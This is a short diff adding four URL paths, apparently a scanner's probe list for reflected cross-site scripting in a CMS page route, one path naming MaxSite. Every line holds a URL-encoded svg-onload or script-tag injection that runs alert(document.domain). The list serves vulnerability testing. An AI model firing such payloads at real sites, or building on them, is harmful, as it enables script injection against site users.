@@ -1,0 +1,4 @@
+/page/hello/1%22%3E%3Csvg/onload=alert(document.domain)%3E
+/page/1%22%3E%3Csvg/onload=alert(document.domain)%3E
+/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
